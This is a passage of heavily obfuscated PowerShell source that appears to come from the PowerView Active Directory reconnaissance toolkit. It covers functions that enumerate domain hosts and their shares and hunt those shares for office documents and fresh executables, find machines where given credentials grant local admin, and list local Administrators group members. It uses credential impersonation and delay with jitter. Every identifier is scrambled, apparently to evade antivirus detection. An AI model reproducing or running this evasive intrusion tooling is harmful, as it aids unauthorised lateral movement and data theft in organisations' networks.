        [ValidatePattern({(("{2}{1}{0}"-f'{0}','}','{0}{0}{0')) -f[chAR]92})]
        [Alias({"{0}{1}"-f'S','hare'})]
        [String[]]
        ${sh`AR`EP`AtH},

        [String[]]
        ${EX`ClUDED`shAr`Es} = @('C$', (('Adm'+'i'+'n{0}')-f [CHAR]36), (('Print'+'1Ga')."R`ePL`Ace"(([char]49+[char]71+[char]97),'$')), ((('IPCt'+'Bi') -rePlAcE([CHAR]116+[CHAR]66+[CHAR]105),[CHAR]36))),

        [Parameter(PArAmETErsetNaME = "fILE`SpEc`I`FICAtioN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${l`A`StaCcEsS`TI`Me},

        [Parameter(PARAmETErSETnaMe = "FilespECi`FiC`At`iOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${last`WriTET`iME},

        [Parameter(pArameterSETnAMe = "Fil`E`sP`ecI`FicATiON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${crEA`TioNT`I`Me},

        [Parameter(paraMEteRsetNamE = "OF`FICE`DOcs")]
        [Switch]
        ${oFf`I`ce`DocS},

        [Parameter(PArameTERSeTNaMe = "F`ReS`hexES")]
        [Switch]
        ${Fr`e`S`HexeS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{4}{2}{3}"-f'main','Do','ontrol','ler','C'})]
        [String]
        ${se`Rv`er},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{0}{1}{2}"-f'OneL','e','vel'}, {"{1}{2}{0}" -f 'ee','Su','btr'})]
        [String]
        ${Se`ArChSCO`pe} = ("{2}{1}{0}" -f 'tree','ub','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsULtPAG`ESi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sErVeR`TiM`el`I`miT},

        [Switch]
        ${TOmBS`To`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`eNT`Ial} =   ${5`R0Vk}::"eMP`TY",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`eLAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${Ji`T`TEr} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tH`Re`ADS} = 20
    )

    BEGIN {
        ${COMpUtE`R`SearchEra`Rgum`eNtS} = @{
            ("{1}{0}{2}"-f 'o','Pr','perties') = ("{1}{3}{0}{2}"-f 's','dns','tname','ho')
        }
        if (${pSb`Ou`NdP`ARAme`TeRS}[("{4}{3}{1}{0}{2}" -f 'e','ut','rDomain','p','Com')]) { ${coMP`UtErseARCH`ER`A`R`GU`Me`NTs}[("{1}{0}" -f'in','Doma')] = ${Co`mPutE`Rd`oM`Ain} }
        if (${pSb`OuNd`PaRaME`T`ers}[("{2}{0}{3}{1}{4}"-f 'er','Filte','Comput','LDAP','r')]) { ${COMp`U`T`ERSEARcHErargu`Me`Nts}[("{1}{0}{2}{3}" -f 'PFi','LDA','lte','r')] = ${comPu`T`E`RlDAPFIltER} }
        if (${P`sbouNd`pa`RAM`EtERS}[("{1}{0}{2}{3}" -f 'r','Compute','Searc','hBase')]) { ${comPU`TeRSEArC`hEr`ArG`UmEN`TS}[("{0}{2}{1}" -f'SearchB','e','as')] = ${CoMp`UTe`R`SEAR`ChBA`se} }
        if (${pSb`Ou`NDpAr`A`MetErS}[("{0}{2}{3}{1}" -f 'ComputerOp','System','era','ting')]) { ${C`O`mPutERse`A`R`cherArgUments}[("{2}{0}{1}{3}" -f 'peratin','g','O','System')] = ${OpE`RAT`INgs`YSTem} }
        if (${pSBoUndPa`RA`M`ETerS}[("{0}{3}{1}{2}"-f 'Com','terServic','ePack','pu')]) { ${cOmPUTe`RSe`ARcherAr`G`UME`NTs}[("{1}{2}{0}{3}"-f 'a','Servic','eP','ck')] = ${S`er`VIcEPa`CK} }
        if (${psB`Ou`Nd`PaRa`MEtErS}[("{3}{0}{1}{4}{2}" -f 'ompu','terS','e','C','iteNam')]) { ${C`OMP`U`TeRSea`RcH`eRarG`UmE`N`TS}[("{0}{2}{1}"-f'SiteN','e','am')] = ${SiTeN`AME} }
        if (${psboU`Ndp`A`Ram`eTeRS}[("{2}{1}{0}"-f 'r','e','Serv')]) { ${COMPUTErS`E`AR`CH`ErA`RGUmEnTs}[("{2}{1}{0}" -f'er','rv','Se')] = ${Ser`VEr} }
        if (${PSBo`UNdpA`R`Am`ETerS}[("{0}{1}{2}" -f'Se','arc','hScope')]) { ${C`OmP`UTeRseAR`CHerarg`UmeNTs}[("{1}{2}{0}" -f 'pe','Searc','hSco')] = ${s`e`Arch`SCOPE} }
        if (${PS`B`OuNDPARA`mETeRs}[("{1}{2}{0}"-f'ageSize','Result','P')]) { ${cO`MpuTe`R`S`earCHerarG`U`mENTs}[("{4}{3}{1}{0}{2}" -f 'Siz','age','e','tP','Resul')] = ${rESuLT`pa`Ge`siZE} }
        if (${PSbo`UNDpAra`mE`T`ErS}[("{1}{2}{3}{0}" -f'imit','Serve','rT','imeL')]) { ${COMpUteR`S`EARC`heRAR`gu`MeN`TS}[("{3}{0}{1}{2}" -f'ime','L','imit','ServerT')] = ${ser`Vert`I`M`eLIMiT} }
        if (${pSb`O`UndPAr`AmeTe`RS}[("{0}{2}{3}{1}"-f 'Tomb','e','st','on')]) { ${c`Om`PutER`se`ARchEr`Argum`e`N`TS}[("{0}{2}{1}{3}" -f'Tomb','n','sto','e')] = ${tOm`B`stONe} }
        if (${P`SBOUN`DPaR`Ame`TerS}[("{0}{2}{1}"-f'Cred','ntial','e')]) { ${comPu`T`ERS`EaRch`ErARgUm`EnTs}[("{2}{1}{0}" -f'al','redenti','C')] = ${CrE`DeNtI`Al} }

        if (${PSBOundPa`R`Am`ETeRs}[("{2}{1}{0}" -f 'Name','r','Compute')]) {
            ${tAr`gE`TcOm`PuTe`RS} = ${COMPu`T`e`RnaMe}
        }
        else {
            &("{1}{0}{2}" -f '-Verbos','Write','e') ("{1}{5}{3}{9}{0}{7}{2}{4}{10}{8}{6}" -f'e] Queryin','[Find-','computers in','nSh',' t','InterestingDomai','in','g ','a','areFil','he dom')
            ${T`Ar`ge`TCO`MPuTers} = &("{2}{4}{1}{5}{0}{3}"-f 'nComp','t-Doma','G','uter','e','i') @ComputerSearcherArguments | &("{0}{1}{2}" -f'Sele','ct-Objec','t') -ExpandProperty ("{3}{0}{1}{2}"-f 'shostn','am','e','dn')
        }
        &("{0}{1}{3}{2}" -f 'W','r','e','ite-Verbos') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${TAR`G`ETCOmP`UtERs}."len`GTh" -eq 0) {
            throw ("{12}{3}{9}{6}{14}{4}{16}{0}{10}{5}{8}{1}{11}{15}{2}{13}{7}" -f 'ingDomainShar','und ','numer','F','teres','] N','d-','te','o hosts fo','in','eFile','to ','[','a','In','e','t')
        }

        
        ${hOSt`e`Num`B`LOck} = {
            Param(${cOM`pUte`Rname}, ${IN`c`LudE}, ${e`xCLUdEDsh`ARes}, ${oF`FiCEDO`cs}, ${eXC`L`U`deH`IddeN}, ${frEsh`e`XeS}, ${CHEckw`Ri`TEa`Cc`eSS}, ${tOK`E`N`HandLe})

            if (${T`Oke`N`HandLe}) {
                
                ${N`Ull} = &("{4}{0}{3}{2}{1}{5}"-f 'v','serImpers','-U','oke','In','onation') -TokenHandle ${TOK`eN`HaN`dLe} -Quiet
            }

            ForEach (${tAr`geTC`o`MpuTER} in ${cOMP`Ute`RnAMe}) {

                ${SE`A`RchSHAR`es} = @()
                if (${taRge`Tc`oMp`UtER}.("{0}{2}{1}" -f'S','With','tarts').Invoke('\\')) {
                    
                    ${Sea`R`ChShArEs} += ${taRgEt`COmp`UT`er}
                }
                else {
                    ${u`p} = &("{3}{1}{0}{2}" -f 'necti','on','on','Test-C') -Count 1 -Quiet -ComputerName ${tA`Rgetco`M`puteR}
                    if (${u`p}) {
                        
                        ${Sha`ReS} = &("{1}{2}{0}{3}" -f 'r','Get-Ne','tSha','e') -ComputerName ${T`ArGe`TcomP`UTeR}
                        ForEach (${sHA`RE} in ${Sh`A`REs}) {
                            ${s`h`ArENAMe} = ${sh`Are}."Na`ME"
                            ${PA`Th} = '\\'+${TA`Rge`TComPu`TEr}+'\'+${ShAr`e`NA`ME}
                            
                            if ((${s`HaREn`AmE}) -and (${SHAR`E`NaME}.("{0}{1}"-f 'T','rim').Invoke() -ne '')) {
                                
                                if (${EXClU`deDsh`AR`Es} -NotContains ${SHA`R`ENAmE}) {
                                    
                                    try {
                                        ${n`Ull} =   ${p4z`7`Sd}::("{0}{1}{2}"-f 'GetF','ile','s').Invoke(${p`ATH})
                                        ${s`eaR`ChSHAReS} += ${pA`TH}
                                    }
                                    catch {
                                        &("{1}{0}{3}{2}"-f'ite-Ve','Wr','bose','r') ('[!]'+' '+'No'+' '+'a'+'cces'+'s '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${SHa`Re} in ${SEA`RCH`sHArEs}) {
                    &("{2}{3}{0}{1}{4}"-f 'Ver','b','Writ','e-','ose') ('Searchi'+'n'+'g '+'sh'+'are:'+' '+"$Share")
                    ${se`Arc`ha`RGs} = @{
                        ("{0}{1}"-f 'Pa','th') = ${sHa`RE}
                        ("{1}{0}{2}"-f 'ud','Incl','e') = ${I`NCL`Ude}
                    }
                    if (${O`FF`i`cedOcs}) {
                        ${s`e`ARcHArGS}[("{1}{3}{2}{0}" -f's','O','c','fficeDo')] = ${O`FF`I`cedoCs}
                    }
                    if (${FRe`S`heXES}) {
                        ${S`eArCH`ArGS}[("{2}{1}{0}"-f 'Es','X','FreshE')] = ${f`RESHE`x`ES}
                    }
                    if (${La`Stacce`Ss`Ti`ME}) {
                        ${S`e`ARChAr`gs}[("{3}{1}{4}{0}{2}"-f's','ce','Time','LastAc','s')] = ${LAstAcCessT`I`Me}
                    }
                    if (${L`AS`Tw`RitEtimE}) {
                        ${S`E`ARC`hARGS}[("{1}{2}{0}" -f 'tWriteTime','La','s')] = ${LaStWRi`TE`Ti`Me}
                    }
                    if (${c`ReaTiOn`TIme}) {
                        ${SeaR`c`H`Args}[("{2}{1}{0}"-f'Time','n','Creatio')] = ${CRE`AT`ION`TiME}
                    }
                    if (${CHE`CkWRitea`Cce`sS}) {
                        ${SE`A`R`cHarGs}[("{0}{2}{1}{3}" -f'Chec','Acc','kWrite','ess')] = ${checKW`RiT`E`ACcEss}
                    }
                    &("{3}{1}{2}{0}" -f 'File','s','ting','Find-Intere') @SearchArgs
                }
            }

            if (${toK`e`Nh`Andle}) {
                &("{0}{1}{3}{2}{4}"-f'I','nvoke-Reve','o','rtT','Self')
            }
        }

        ${lOgo`N`TOKeN} = ${N`ULL}
        if (${PSBO`UnDPA`RAm`E`Te`Rs}[("{0}{2}{1}" -f 'Cred','al','enti')]) {
            if (${psBoUnDpARam`e`Te`RS}[("{0}{1}" -f 'D','elay')] -or ${psbOunD`Par`AmEt`ERS}[("{2}{3}{1}{0}"-f'ccess','nSu','St','opO')]) {
                ${LOGONT`Ok`En} = &("{4}{2}{1}{0}{3}"-f'o','Impersonati','ke-User','n','Invo') -Credential ${cRe`den`TIal}
            }
            else {
                ${lo`GOnto`kEn} = &("{0}{5}{2}{1}{4}{3}" -f'Invo','nat','UserImperso','on','i','ke-') -Credential ${CR`eDEn`TiAL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`SBoundpaR`Am`ETeRS}[("{1}{0}" -f 'elay','D')] -or ${psboU`N`dPaR`AmE`TERS}[("{2}{0}{1}" -f'ucces','s','StopOnS')]) {

            &("{2}{0}{1}{3}" -f 'te-','Ver','Wri','bose') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{0}{2}{3}{4}{1}" -f 'W','se','ri','te-','Verbo') ('[Find-'+'Inter'+'est'+'ing'+'Dom'+'ainS'+'hareFil'+'e] '+'Dela'+'y:'+' '+"$Delay, "+'J'+'i'+'tter: '+"$Jitter")
            ${COUN`T`Er} = 0
            ${r`AND`No} = &("{2}{0}{1}" -f'-Objec','t','New') ("{0}{2}{3}{1}"-f'Syst','om','em.','Rand')

            ForEach (${t`ArGETComP`U`T`ER} in ${Targ`ETCOMPUte`RS}) {
                ${co`Un`TER} = ${C`o`UnTER} + 1

                
                &("{2}{0}{1}{3}" -f 'ta','rt-S','S','leep') -Seconds ${Ra`Nd`No}.("{1}{0}" -f 'xt','Ne').Invoke((1-${JI`TtEr})*${D`eL`AY}, (1+${jiT`Ter})*${dE`laY})

                &("{1}{2}{3}{0}" -f 'se','Write-Ver','b','o') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{2}{0}{1}{3}" -f'Com','ma','Invoke-','nd') -ScriptBlock ${hOSTe`Numb`LOCk} -ArgumentList ${TA`R`GETC`oMPUTEr}, ${inCLU`de}, ${EX`cLuDeD`ShAr`Es}, ${oFFic`edo`Cs}, ${e`X`clUDEHId`DeN}, ${FR`esHe`X`Es}, ${C`HECKWR`It`EacCESs}, ${LOgON`Tok`EN}
            }
        }
        else {
            &("{0}{2}{1}{3}"-f 'Wri','-','te','Verbose') ('[F'+'ind-In'+'teresting'+'Do'+'m'+'a'+'in'+'S'+'hareF'+'il'+'e] '+'Us'+'ing '+'thre'+'adi'+'n'+'g '+'w'+'ith '+'thre'+'ad'+'s:'+' '+"$Threads")

            
            ${SCr`iPtPaRA`ms} = @{
                ("{0}{1}{2}"-f'Incl','ud','e') = ${i`NCLU`de}
                ("{0}{1}{2}{3}"-f'Exclu','de','dSh','ares') = ${EXc`l`UdE`DshAReS}
                ("{0}{1}{2}"-f'Of','ficeDo','cs') = ${oF`FIC`ed`ocS}
                ("{2}{1}{0}"-f'den','ludeHid','Exc') = ${E`Xcl`UDehId`dEN}
                ("{1}{0}{3}{2}" -f 'X','FreshE','s','E') = ${F`R`ESheXes}
                ("{2}{4}{3}{1}{0}" -f 'ess','c','Check','riteAc','W') = ${CheCk`WrI`Teac`c`esS}
                ("{1}{2}{0}" -f'ndle','Toke','nHa') = ${l`OGoNt`okEN}
            }

            
            &("{2}{1}{0}{4}{3}"-f'Thr','w-','Ne','on','eadedFuncti') -ComputerName ${TA`RgeT`Co`mpu`TERs} -ScriptBlock ${H`oSTe`NUMb`lock} -ScriptParameters ${sC`Rip`TpARAms} -Threads ${tHrea`dS}
        }
    }

    END {
        if (${lOgO`NT`OK`eN}) {
            &("{0}{4}{2}{3}{1}"-f'I','f','-Reve','rtToSel','nvoke') -TokenHandle ${L`O`GoNT`OKen}
        }
    }
}


function f`inD-`lOcal`A`DMIN`ACCESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f'S','P','ShouldProce','ss'}, '')]
    [OutputType([String])]
    Param(
        [Parameter(pOsiTIoN = 0, vAlUeFRomPipEline = ${Tr`Ue}, vaLUeFROmPIPELinebypROPErtYNaMe = ${t`RUe})]
        [Alias({"{3}{0}{2}{1}" -f'S','ame','HostN','DN'})]
        [String[]]
        ${CO`mpUT`er`NAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMpu`T`ERdom`AIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COmp`Ut`ERLda`PFiL`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`ompuTER`seAr`chbA`sE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f'peratingSy','ste','O','m'})]
        [String]
        ${C`Om`PuTeRo`p`Er`AtING`SYsTeM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}" -f'erviceP','ack','S'})]
        [String]
        ${coMPU`Te`RSErvI`C`E`P`AcK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Si','teName'})]
        [String]
        ${COM`p`U`TE`R`SItenAMe},

        [Switch]
        ${ch`e`Cks`HarEA`cCeSs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f'nC','ont','Domai','roller'})]
        [String]
        ${Se`RV`eR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}{2}" -f 've','OneLe','l'}, {"{1}{2}{0}" -f 'tree','Su','b'})]
        [String]
        ${SeAr`CH`sCO`PE} = ("{1}{0}{2}" -f 'ubt','S','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ES`ULtpAGesIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`V`Ert`i`MELimiT},

        [Switch]
        ${TOmBSt`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REde`NT`IaL} =  ${5R0vk}::"eMp`Ty",

        [ValidateRange(1, 10000)]
        [Int]
        ${dEL`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`it`TeR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${tH`REA`DS} = 20
    )

    BEGIN {
        ${CompUterSe`ARcHeRA`R`guME`N`TS} = @{
            ("{1}{3}{0}{2}"-f 'e','Pro','s','perti') = ("{0}{2}{1}" -f 'dn','stname','sho')
        }
        if (${p`sbo`Un`dPAraMEteRs}[("{2}{1}{0}{3}" -f'te','pu','Com','rDomain')]) { ${C`OmPUTers`ea`Rche`R`ArGUMeN`Ts}[("{0}{1}{2}"-f 'Doma','i','n')] = ${comput`E`R`domAiN} }
        if (${PS`BOuNd`pA`RAm`ETeRS}[("{4}{0}{3}{2}{1}{5}" -f'mpu','l','DAPFi','terL','Co','ter')]) { ${co`MpUT`e`R`searche`R`ArgUM`EnTS}[("{1}{2}{0}"-f 'PFilter','L','DA')] = ${co`mpuT`eRld`A`pfi`LTeR} }
        if (${psbo`UndparaM`eT`eRS}[("{2}{4}{3}{1}{0}" -f'e','earchBas','C','terS','ompu')]) { ${cO`mPUt`er`SEaR`CHERaRGuMeNtS}[("{1}{2}{0}{3}"-f 'h','Se','arc','Base')] = ${C`omPU`TE`RSea`RC`h`BasE} }
        if (${PSBOu`NDpA`RAm`e`T`ERs}[("{2}{0}{1}{3}"-f 'i','n','Unconstra','ed')]) { ${C`omP`UTerse`A`RCHer`Arg`UmENts}[("{0}{2}{1}{3}" -f'Un','ne','constrai','d')] = ${U`NcO`NS`TRAiN`ED} }
        if (${P`Sb`OUNdp`A`RameterS}[("{4}{1}{6}{2}{0}{5}{3}" -f'er','mput','rOp','ystem','Co','atingS','e')]) { ${Com`PUtERsEa`RC`hera`RgumeNts}[("{4}{3}{0}{1}{2}"-f 's','t','em','tingSy','Opera')] = ${opErA`TI`N`gs`YSTEm} }
        if (${P`sbo`UnD`P`AraMeters}[("{4}{5}{3}{2}{0}{1}" -f 'vicePa','ck','Ser','r','Comput','e')]) { ${c`O`MpuTErSE`Arch`er`AR`GumentS}[("{2}{3}{0}{1}"-f 'ePac','k','Serv','ic')] = ${se`RV`I`cEpAcK} }
        if (${P`Sbo`UN`dpA`RAmeters}[("{1}{0}{2}{3}{4}" -f'ompu','C','terSit','eNam','e')]) { ${coMpUT`eRsE`Arc`H`ERar`gU`MENTS}[("{0}{1}{2}" -f 'S','iteNa','me')] = ${S`ITENA`me} }
        if (${PS`Bo`U`NDpaRame`TErS}[("{0}{1}"-f'Se','rver')]) { ${CompuTE`R`Sear`c`H`erARgU`mE`NtS}[("{0}{1}"-f'Se','rver')] = ${s`ErVER} }
        if (${psBou`NdPArA`Me`TE`RS}[("{1}{2}{3}{0}" -f 'ope','Se','arc','hSc')]) { ${C`OMPute`RSEarc`HeRar`gU`M`E`N`TS}[("{2}{1}{0}"-f 'ope','Sc','Search')] = ${S`EARCHS`cOpE} }
        if (${pS`BOundP`ArA`mEteRs}[("{0}{3}{1}{2}"-f 'Resu','tPageSiz','e','l')]) { ${CoMPutErSea`RchErA`R`GUmEn`TS}[("{1}{2}{0}{3}"-f'ltPage','Res','u','Size')] = ${rEsul`T`P`AgE`SizE} }
        if (${psBou`NdpaR`AmE`TE`RS}[("{0}{1}{2}"-f 'Serve','rTimeLim','it')]) { ${C`oMpute`RsEarCheR`Ar`GumEN`TS}[("{2}{0}{3}{1}"-f'r','erTimeLimit','Se','v')] = ${s`Er`VERt`ImELiMit} }
        if (${pSBouNdpa`R`AmETE`Rs}[("{2}{0}{1}" -f'mbs','tone','To')]) { ${coMP`UT`eRSEa`RCHEr`A`RG`UMENts}[("{1}{0}"-f'ombstone','T')] = ${TomB`stO`Ne} }
        if (${PSB`oUnd`pA`RA`MEters}[("{1}{0}{2}" -f 'ti','Creden','al')]) { ${c`omPU`Te`RS`EarChE`RARGUM`E`N`TS}[("{3}{0}{2}{1}"-f 'ed','ial','ent','Cr')] = ${c`RedENT`iAL} }

        if (${PS`BOundPAra`Me`Te`Rs}[("{3}{0}{2}{1}"-f 'o','terName','mpu','C')]) {
            ${tARGE`Tc`o`MpU`TeRs} = ${cOM`PUT`E`RNAmE}
        }
        else {
            &("{1}{4}{3}{0}{2}"-f 'os','Write-V','e','rb','e') ("{14}{11}{7}{1}{15}{6}{13}{3}{8}{0}{12}{4}{2}{5}{9}{10}" -f 'omp','lAd','rs','uery','e',' in','nAccess]','nd-Loca','ing c',' ','the domain','i','ut',' Q','[F','mi')
            ${tAr`GeT`c`oM`PUtERs} = &("{1}{0}{2}{3}"-f '-DomainComp','Get','ute','r') @ComputerSearcherArguments | &("{0}{2}{1}{4}{3}"-f 'S','e','el','-Object','ct') -ExpandProperty ("{1}{0}{2}{3}" -f 'nsho','d','stnam','e')
        }
        &("{1}{2}{0}" -f'ose','Wri','te-Verb') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if (${tARGe`TC`om`puTErS}."lE`Ng`Th" -eq 0) {
            throw ("{0}{8}{6}{3}{10}{1}{4}{2}{7}{9}{5}"-f '[Fin','cess] No hos','to','Admi','ts found ','ate','l',' enume','d-Loca','r','nAc')
        }

        
        ${h`ostEn`U`Mb`lOCk} = {
            Param(${Co`M`p`UtErNA`me}, ${Tokenha`N`dLe})

            if (${T`OKenHa`N`dLe}) {
                
                ${n`UlL} = &("{2}{3}{5}{0}{4}{1}" -f'er','on','I','nv','Impersonati','oke-Us') -TokenHandle ${TOK`en`HAnD`LE} -Quiet
            }

            ForEach (${taRG`eT`coMPU`TeR} in ${c`OM`pUTE`RName}) {
                ${up} = &("{1}{2}{0}" -f 'ction','T','est-Conne') -Count 1 -Quiet -ComputerName ${Ta`Rg`etc`O`MpUtEr}
                if (${uP}) {
                    
                    ${a`C`CEsS} = &("{0}{1}{2}" -f 'Test-AdminAcce','s','s') -ComputerName ${tar`ge`T`COMPuter}
                    if (${a`CCEsS}."I`saDM`in") {
                        ${T`AR`GETComp`UTER}
                    }
                }
            }

            if (${t`OKenhA`Nd`Le}) {
                &("{4}{5}{1}{2}{3}{0}" -f'lf','e-','RevertToS','e','Invo','k')
            }
        }

        ${L`og`ONToKEN} = ${nu`Ll}
        if (${psBouN`D`PARamEt`e`Rs}[("{1}{2}{0}"-f'dential','C','re')]) {
            if (${PsB`Oun`dp`ARAM`e`TErs}[("{1}{0}" -f'elay','D')] -or ${p`sB`OundpaRAm`E`Te`Rs}[("{3}{2}{0}{1}" -f 'nSucc','ess','O','Stop')]) {
                ${lO`g`ONTOkEN} = &("{7}{2}{5}{0}{4}{1}{3}{6}" -f 'p','s','nvo','onat','er','ke-UserIm','ion','I') -Credential ${Cr`edE`Nti`AL}
            }
            else {
                ${LoGO`N`TOkEn} = &("{4}{1}{5}{0}{2}{3}"-f'rIm','nvoke','pers','onation','I','-Use') -Credential ${cRe`DENTi`AL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pS`BoUnDp`ARamET`erS}[("{1}{0}" -f'ay','Del')] -or ${P`sboU`NDPara`m`eteRs}[("{1}{2}{0}" -f 's','Stop','OnSucces')]) {

            &("{1}{3}{0}{2}" -f 'r','Write-V','bose','e') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &("{1}{4}{0}{2}{3}"-f'e-V','W','e','rbose','rit') ('[Find-Loca'+'lA'+'dm'+'in'+'Access] '+'D'+'elay: '+"$Delay, "+'J'+'it'+'ter: '+"$Jitter")
            ${CoUnt`Er} = 0
            ${Ra`N`DnO} = &("{1}{0}{2}"-f 'ec','New-Obj','t') ("{2}{3}{1}{0}"-f 'om','Rand','Syste','m.')

            ForEach (${tArg`ET`COmPU`TER} in ${TARg`etC`omp`UTers}) {
                ${couN`TEr} = ${Co`UN`Ter} + 1

                
                &("{0}{2}{1}" -f 'Start','Sleep','-') -Seconds ${R`ANd`NO}.("{1}{0}"-f 'ext','N').Invoke((1-${jiT`TEr})*${dE`l`AY}, (1+${j`it`TEr})*${de`lay})

                &("{3}{2}{0}{1}{4}" -f 'e','-Verbo','t','Wri','se') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{2}{3}{0}"-f 'mand','Invoke','-Co','m') -ScriptBlock ${H`OsTenu`m`BLOcK} -ArgumentList ${TArG`e`TcOMPUt`eR}, ${lO`gO`Ntoken}
            }
        }
        else {
            &("{1}{2}{0}{3}"-f 'erb','Write-','V','ose') ('[Fi'+'nd-Loc'+'a'+'lA'+'d'+'m'+'inAccess'+'] '+'U'+'sing '+'thr'+'e'+'a'+'ding '+'wit'+'h '+'thr'+'ead'+'s'+': '+"$Threads")

            
            ${SCri`pT`PARams} = @{
                ("{0}{2}{1}{3}"-f'To','nHandl','ke','e') = ${lOg`oNTOK`en}
            }

            
            &("{2}{4}{5}{0}{1}{3}"-f'ct','i','New-Th','on','reade','dFun') -ComputerName ${t`Ar`GeTCo`mpu`TeRS} -ScriptBlock ${H`oS`TENum`B`LOCk} -ScriptParameters ${SC`RIptPA`RaMS} -Threads ${T`H`READS}
        }
    }
}


function f`INd-DOMa`I`NLo`calGr`oU`PMEmB`Er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{4}{2}" -f'P','ouldPr','s','SSh','oces'}, '')]
    [OutputType({"{2}{1}{4}{5}{3}{0}" -f 'upMember.API','w','Po','o','erView.LocalG','r'})]
    [OutputType({"{6}{3}{2}{0}{5}{4}{8}{7}{1}{9}"-f'Grou','in','ocal','.L','Mem','p','PowerView','r.W','be','NT'})]
    Param(
        [Parameter(poSiTioN = 0, vALUEfrOmpIpeLIne = ${t`RUE}, vALUeFRomPipEliNEbYpRopeRTyName = ${Tr`UE})]
        [Alias({"{3}{2}{0}{1}"-f'Nam','e','t','DNSHos'})]
        [String[]]
        ${COM`Pute`RN`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${coM`PUTeRdOM`A`IN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOmpUtEr`lDAp`FIL`T`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OMP`Uter`sEArC`HBase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{3}{1}"-f 'Ope','em','ingSys','t','rat'})]
        [String]
        ${C`OMpuT`ERoPeR`A`TINgS`YStEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}" -f 'Ser','ack','ceP','vi'})]
        [String]
        ${Co`Mp`U`TERse`RvI`CEPA`CK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Si','teNam','e'})]
        [String]
        ${C`Om`pUtERsI`TenamE},

        [Parameter(VaLUefROMpiPeLiNeByProPErtYName = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gR`O`UpNAmE} = ("{4}{3}{2}{1}{0}"-f'ators','inistr','m','d','A'),

        [ValidateSet('API', {"{1}{0}"-f'T','WinN'})]
        [Alias({"{2}{1}{0}{3}" -f 'ctionMetho','e','Coll','d'})]
        [String]
        ${MEt`HOd} = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}"-f 'Do','roller','nt','mainCo'})]
        [String]
        ${SeR`V`er},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{1}{0}" -f 'vel','OneLe'}, {"{1}{0}" -f 'e','Subtre'})]
        [String]
        ${s`eArc`HsCoPE} = ("{0}{1}"-f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`Ult`P`AgesizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serV`erT`I`meli`MIt},

        [Switch]
        ${to`M`BStone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`EdEntI`Al} =  (&("{2}{0}{1}"-f 'ab','LE','VAri') ("{1}{0}"-f 'Vk','5r0'))."vAL`Ue"::"E`MpTy",

        [ValidateRange(1, 10000)]
        [Int]
        ${de`LAy} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`iT`Ter} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${T`Hr`eadS} = 20
    )

    BEGIN {
        ${Co`mPuTe`RseARcHEra`R`gu`MenTS} = @{
            ("{1}{2}{0}"-f'ies','Pr','opert') = ("{0}{2}{1}" -f'dnshost','ame','n')
        }
        if (${P`Sb`o`U`NDpARAmETers}[("{1}{2}{3}{0}"-f'ain','Compute','rDo','m')]) { ${cO`mpUTerSEAR`CheR`ArG`U`me`NTS}[("{0}{2}{1}" -f 'Do','in','ma')] = ${c`OMPU`T`erdO`maIn} }
        if (${pSboUnDp`ArA`met`eRs}[("{0}{1}{2}{3}" -f 'Compu','terLDAPFil','te','r')]) { ${COM`PUt`eRSEA`Rc`hE`RaRg`UmENTs}[("{1}{2}{0}"-f 'r','LDA','PFilte')] = ${COMPuTE`RlD`AP`FI`l`TeR} }
